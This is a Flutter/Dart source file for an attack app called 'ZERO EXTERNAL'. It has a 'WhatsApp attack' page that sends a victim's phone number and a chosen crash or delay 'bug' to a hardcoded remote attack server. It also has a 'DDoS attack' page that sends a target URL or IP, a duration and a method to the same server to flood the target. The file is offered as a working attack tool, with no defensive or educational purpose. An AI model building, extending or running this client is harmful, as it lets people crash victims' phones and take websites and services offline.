import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';

class AttackPage extends StatefulWidget {
  const AttackPage({super.key});

  @override
  State<AttackPage> createState() => _AttackPageState();
}

class _AttackPageState extends State<AttackPage> {
  final TextEditingController _numberController = TextEditingController();
  String _selectedBug = '';
  bool _isLoading = false;
  String _result = '';
  late VideoPlayerController _controller;

  @override
  void initState() {
    super.initState();
    _controller = VideoPlayerController.asset('assets/banner.mp4')
      ..initialize().then((_) {
        setState(() {});
        _controller.setLooping(true);
        _controller.setVolume(0.0);
        _controller.play();
      });
  }

  @override
  void dispose() {
    _controller.dispose();
    super.dispose();
  }

  Future<void> _launchAttack() async {
    if (_numberController.text.isEmpty || _selectedBug.isEmpty) {
      setState(() {
        _result = '❌ Please fill all fields';
      });
      return;
    }

    setState(() {
      _isLoading = true;
      _result = '';
    });

    try {
      final response = await http.get(
        Uri.parse('http://152.42.205.39:3003/api?target=${_numberController.text}&type=$_selectedBug'), // ganti ip Lo 
      );

      if (response.statusCode == 200) {
        final responseBody = response.body;
        final message = _extractMessage(responseBody);
        
        setState(() {
          _result = '''
ATTACK SUCCESSFULLY LAUNCHED!
TARGET: ${_numberController.text}
BUG TYPE: $_selectedBug
STATUS: ACTIVE
$message
''';
        });
      } else {
        setState(() {
          _result = '❌ Failed to launch attack';
        });
      }
    } catch (e) {
      setState(() {
        _result = '❌ Error: $e';
      });
    } finally {
      setState(() {
        _isLoading = false;
      });
    }
  }

  String _extractMessage(String response) {
    try {
      final messageIndex = response.indexOf('"message"');
      if (messageIndex == -1) return '';
      final valueStart = response.indexOf(':', messageIndex) + 1;
      final valueEnd = response.indexOf(',', valueStart);
      final messageString = response.substring(valueStart, valueEnd == -1 ? response.length : valueEnd);
      return messageString.replaceAll('"', '').trim();
    } catch (e) {
      return '';
    }
  }

  void _showBugSelection() {
    showModalBottomSheet(
      context: context,
      backgroundColor: const Color(0xFF1A1A1A),
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(25)),
      ),
      builder: (context) {
        return Container(
          padding: const EdgeInsets.all(25),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              const Text(
                'SELECT BUG TYPE',
                style: TextStyle(
                  color: Color(0xFFFF4444),
                  fontSize: 22,
                  fontWeight: FontWeight.w800,
                ),
              ),
              const SizedBox(height: 20),
              ...[
                'DELAY INVISIBLE [SUPPORT ANDRO OR IOS]',
                'DELAY X BLANK VISIBLE',
                'CRASH UI ANDRO',
                'BULLDOZER INVISIBLE',
              ].map((bug) => ListTile(
                leading: const Icon(FontAwesomeIcons.whatsapp, color: Color(0xFFFF4444)),
                title: Text(
                  bug,
                  style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w600),
                ),
                onTap: () {
                  setState(() {
                    _selectedBug = bug.split(' ')[0].toLowerCase();
                  });
                  Navigator.pop(context);
                },
              )).toList(),
            ],
          ),
        );
      },
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        title: const Text(
          'ZERO EXTERNAL',
          style: TextStyle(
            fontSize: 24,
            fontWeight: FontWeight.w900,
            color: Color(0xFFFF4444),
            letterSpacing: 2,
          ),
        ),
        centerTitle: true,
      ),
      body: SingleChildScrollView(
        padding: const EdgeInsets.all(20),
        child: Column(
          children: [
            Container(
              height: 280,
              width: double.infinity,
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(20),
                border: Border.all(color: const Color(0xFFFF4444), width: 2),
                boxShadow: [
                  BoxShadow(
                    color: const Color(0xFFFF4444).withOpacity(0.4),
                    blurRadius: 15,
                    spreadRadius: 2,
                  ),
                ],
              ),
              child: ClipRRect(
                borderRadius: BorderRadius.circular(18),
                child: _controller.value.isInitialized
                    ? AspectRatio(
                        aspectRatio: _controller.value.aspectRatio,
                        child: VideoPlayer(_controller),
                      )
                    : Container(
                        color: Colors.black,
                        child: const Center(
                          child: CircularProgressIndicator(color: Color(0xFFFF4444)),
                        ),
                      ),
              ),
            ),
            const SizedBox(height: 20),
            Container(
              padding: const EdgeInsets.all(20),
              decoration: BoxDecoration(
                color: const Color(0xFF1A1A1A),
                borderRadius: BorderRadius.circular(20),
                border: Border.all(color: const Color(0xFFFF4444).withOpacity(0.4)),
                boxShadow: [
                  BoxShadow(
                    color: Colors.black.withOpacity(0.5),
                    blurRadius: 15,
                  ),
                ],
              ),
              child: Column(
                children: [
                  const Row(
                    children: [
                      Icon(FontAwesomeIcons.whatsapp, color: Color(0xFFFF4444), size: 20),
                      SizedBox(width: 10),
                      Text(
                        'WHATSAPP ATTACK',
                        style: TextStyle(
                          color: Color(0xFFFF4444),
                          fontSize: 16,
                          fontWeight: FontWeight.w800,
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 20),
                  TextField(
                    controller: _numberController,
                    style: const TextStyle(color: Colors.white, fontSize: 14),
                    decoration: InputDecoration(
                      labelText: 'Target number',
                      labelStyle: const TextStyle(color: Color(0xFF888888), fontSize: 14),
                      border: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(12),
                      ),
                      focusedBorder: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(12),
                        borderSide: const BorderSide(color: Color(0xFFFF4444), width: 2),
                      ),
                      enabledBorder: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(12),
                        borderSide: BorderSide(color: const Color(0xFFFF4444).withOpacity(0.6)),
                      ),
                      prefixIcon: const Icon(Icons.phone_android_rounded, color: Color(0xFFFF4444), size: 20),
                    ),
                  ),
                  const SizedBox(height: 15),
                  GestureDetector(
                    onTap: _showBugSelection,
                    child: Container(
                      width: double.infinity,
                      padding: const EdgeInsets.all(15),
                      decoration: BoxDecoration(
                        border: Border.all(color: const Color(0xFFFF4444).withOpacity(0.6)),
                        borderRadius: BorderRadius.circular(12),
                        color: Colors.black.withOpacity(0.3),
                      ),
                      child: Row(
                        mainAxisAlignment: MainAxisAlignment.spaceBetween,
                        children: [
                          Text(
                            _selectedBug.isEmpty ? 'Select bug type' : _selectedBug.toUpperCase(),
                            style: TextStyle(
                              color: _selectedBug.isEmpty ? const Color(0xFF888888) : Colors.white,
                              fontSize: 14,
                              fontWeight: FontWeight.w600,
                            ),
                          ),
                          const Icon(Icons.arrow_drop_down_rounded, color: Color(0xFFFF4444)),
                        ],
                      ),
                    ),
                  ),
                  const SizedBox(height: 20),
                  SizedBox(
                    width: double.infinity,
                    height: 50,
                    child: ElevatedButton(
                      onPressed: _isLoading ? null : _launchAttack,
                      style: ElevatedButton.styleFrom(
                        backgroundColor: const Color(0xFFFF4444),
                        foregroundColor: Colors.black,
                        shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(12),
                        ),
                        elevation: 8,
                        shadowColor: const Color(0xFFFF4444).withOpacity(0.5),
                      ),
                      child: _isLoading
                          ? const SizedBox(
                              height: 20,
                              width: 20,
                              child: CircularProgressIndicator(color: Colors.black, strokeWidth: 2),
                            )
                          : const Row(
                              mainAxisAlignment: MainAxisAlignment.center,
                              children: [
                                Icon(Icons.rocket_launch_rounded, size: 20),
                                SizedBox(width: 8),
                                Text(
                                  'ATTACK',
                                  style: TextStyle(
                                    fontWeight: FontWeight.w900,
                                    fontSize: 16,
                                    letterSpacing: 1,
                                  ),
                                ),
                              ],
                            ),
                    ),
                  ),
                  if (_result.isNotEmpty) ...[
                    const SizedBox(height: 20),
                    Container(
                      width: double.infinity,
                      padding: const EdgeInsets.all(15),
                      decoration: BoxDecoration(
                        color: _result.contains('❌') 
                            ? const Color(0xFFFF4444).withOpacity(0.15)
                            : Colors.green.withOpacity(0.15),
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(
                          color: _result.contains('❌') ? const Color(0xFFFF4444) : Colors.green,
                          width: 2,
                        ),
                      ),
                      child: Text(
                        _result,
                        style: TextStyle(
                          color: _result.contains('❌') ? const Color(0xFFFF4444) : Colors.green,
                          fontWeight: FontWeight.w600,
                          fontSize: 12,
                        ),
                      ),
                    ),
                  ],
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
}

class DDoSPage extends StatefulWidget {
  const DDoSPage({super.key});

  @override
  State<DDoSPage> createState() => _DDoSPageState();
}

class _DDoSPageState extends State<DDoSPage> {
  final TextEditingController _targetController = TextEditingController();
  final TextEditingController _timeController = TextEditingController();
  String _selectedMethod = '';
  bool _isLoading = false;
  String _result = '';

  Future<void> _launchDDoS() async {
    if (_targetController.text.isEmpty || _timeController.text.isEmpty || _selectedMethod.isEmpty) {
      setState(() {
        _result = '❌ Please fill all fields';
      });
      return;
    }

    setState(() {
      _isLoading = true;
      _result = '';
    });

    try {
      final response = await http.post(
        Uri.parse('http://152.42.205.39:3003/exc'),
        headers: {'Content-Type': 'application/json'},
        body: '{"target":"${_targetController.text}","time":"${_timeController.text}","method":"$_selectedMethod"}',
      );

      if (response.statusCode == 200) {
        setState(() {
          _result = '''
DDOS ATTACK LAUNCHED
TARGET: ${_targetController.text}
DURATION: ${_timeController.text}s
METHOD: $_selectedMethod
ATTACK IS NOW ACTIVE
''';
        });
      } else {
        setState(() {
          _result = '❌ Failed to launch attack';
        });
      }
    } catch (e) {
      setState(() {
        _result = '❌ Error: $e';
      });
    } finally {
      setState(() {
        _isLoading = false;
      });
    }
  }

  void _showMethodSelection() {
    showModalBottomSheet(
      context: context,
      backgroundColor: const Color(0xFF1A1A1A),
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(25)),
      ),
      builder: (context) {
        return Container(
          padding: const EdgeInsets.all(25),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              const Text(
                'SELECT DDOS METHOD',
                style: TextStyle(
                  color: Color(0xFFFF4444),
                  fontSize: 22,
                  fontWeight: FontWeight.w800,
                ),
              ),
              const SizedBox(height: 20),
              ...[
                'KILL [HIGH INTENSITY]',
                'KOMIX [MIXED METHODS]',
                'R2 [RAPID RESPONSE]',
                'PSHT [POWERFUL STRIKE]',
                'PIDORAS [ADVANCED]',
                'EXERCIST [MAXIMUM POWER]',
              ].map((method) => ListTile(
                leading: const Icon(Icons.security_rounded, color: Color(0xFFFF4444)),
                title: Text(
                  method,
                  style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w600),
                ),
                onTap: () {
                  setState(() {
                    _selectedMethod = method.split(' ')[0].toLowerCase();
                  });
                  Navigator.pop(context);
                },
              )).toList(),
            ],
          ),
        );
      },
    );
  }

  @override
  Widget build(BuildContext context) {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(20),
      child: Column(
        children: [
          Container(
            padding: const EdgeInsets.all(20),
            decoration: BoxDecoration(
              color: const Color(0xFF1A1A1A),
              borderRadius: BorderRadius.circular(20),
              border: Border.all(color: const Color(0xFFFF4444).withOpacity(0.4)),
              boxShadow: [
                BoxShadow(
                  color: Colors.black.withOpacity(0.5),
                  blurRadius: 15,
                ),
              ],
            ),
            child: Column(
              children: [
                const Row(
                  children: [
                    Icon(Icons.shield_outlined, color: Color(0xFFFF4444), size: 24),
                    SizedBox(width: 10),
                    Text(
                      'DDOS ATTACK',
                      style: TextStyle(
                        color: Color(0xFFFF4444),
                        fontSize: 20,
                        fontWeight: FontWeight.w800,
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 20),
                TextField(
                  controller: _targetController,
                  style: const TextStyle(color: Colors.white, fontSize: 14),
                  decoration: InputDecoration(
                    labelText: 'Target url or ip address',
                    labelStyle: const TextStyle(color: Color(0xFF888888), fontSize: 14),
                    border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12),
                    ),
                    focusedBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12),
                      borderSide: const BorderSide(color: Color(0xFFFF4444), width: 2),
                    ),
                    enabledBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12),
                      borderSide: BorderSide(color: const Color(0xFFFF4444).withOpacity(0.6)),
                    ),
                    prefixIcon: const Icon(Icons.language_rounded, color: Color(0xFFFF4444), size: 20),
                  ),
                ),
                const SizedBox(height: 15),
                TextField(
                  controller: _timeController,
                  keyboardType: TextInputType.number,
                  style: const TextStyle(color: Colors.white, fontSize: 14),
                  decoration: InputDecoration(
                    labelText: 'Duration (seconds)',
                    labelStyle: const TextStyle(color: Color(0xFF888888), fontSize: 14),
                    border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12),
                    ),
                    focusedBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12),
                      borderSide: const BorderSide(color: Color(0xFFFF4444), width: 2),
                    ),
                    enabledBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12),
                      borderSide: BorderSide(color: const Color(0xFFFF4444).withOpacity(0.6)),
                    ),
                    prefixIcon: const Icon(Icons.timer_rounded, color: Color(0xFFFF4444), size: 20),
                  ),
                ),
                const SizedBox(height: 15),
                GestureDetector(
                  onTap: _showMethodSelection,
                  child: Container(
                    width: double.infinity,
                    padding: const EdgeInsets.all(15),
                    decoration: BoxDecoration(
                      border: Border.all(color: const Color(0xFFFF4444).withOpacity(0.6)),
                      borderRadius: BorderRadius.circular(12),
                      color: Colors.black.withOpacity(0.3),
                    ),
                    child: Row(
                      mainAxisAlignment: MainAxisAlignment.spaceBetween,
                      children: [
                        Text(
                          _selectedMethod.isEmpty ? 'select ddos method' : _selectedMethod.toUpperCase(),
                          style: TextStyle(
                            color: _selectedMethod.isEmpty ? const Color(0xFF888888) : Colors.white,
                            fontSize: 14,
                            fontWeight: FontWeight.w600,
                          ),
                        ),
                        const Icon(Icons.arrow_drop_down_rounded, color: Color(0xFFFF4444)),
                      ],
                    ),
                  ),
                ),
                const SizedBox(height: 20),
                SizedBox(
                  width: double.infinity,
                  height: 50,
                  child: ElevatedButton(
                    onPressed: _isLoading ? null : _launchDDoS,
                    style: ElevatedButton.styleFrom(
                      backgroundColor: const Color(0xFFFF4444),
                      foregroundColor: Colors.black,
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(12),
                      ),
                      elevation: 8,
                      shadowColor: const Color(0xFFFF4444).withOpacity(0.5),
                    ),
                    child: _isLoading
                        ? const SizedBox(
                            height: 20,
                            width: 20,
                            child: CircularProgressIndicator(color: Colors.black, strokeWidth: 2),
                          )
                        : const Row(
                            mainAxisAlignment: MainAxisAlignment.center,
                            children: [
                              Icon(Icons.rocket_launch_rounded, size: 20),
                              SizedBox(width: 8),
                              Text(
                                'ATTACK',
                                style: TextStyle(
                                  fontWeight: FontWeight.w900,
                                  fontSize: 16,
                                  letterSpacing: 1,
                                ),
                              ),
                            ],
                          ),
                  ),
                ),
                if (_result.isNotEmpty) ...[
                  const SizedBox(height: 20),
                  Container(
                    width: double.infinity,
                    padding: const EdgeInsets.all(15),
                    decoration: BoxDecoration(
                      color: _result.contains('❌') 
                          ? const Color(0xFFFF4444).withOpacity(0.15)
                          : Colors.green.withOpacity(0.15),
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(
                        color: _result.contains('❌') ? const Color(0xFFFF4444) : Colors.green,
                        width: 2,
                      ),
                    ),
                    child: Text(
                      _result,
                      style: TextStyle(
                        color: _result.contains('❌') ? const Color(0xFFFF4444) : Colors.green,
                        fontWeight: FontWeight.w600,
                        fontSize: 12,
                      ),
                    ),
                  ),
                ],
              ],
            ),
          ),
        ],
      ),
    );
  }
}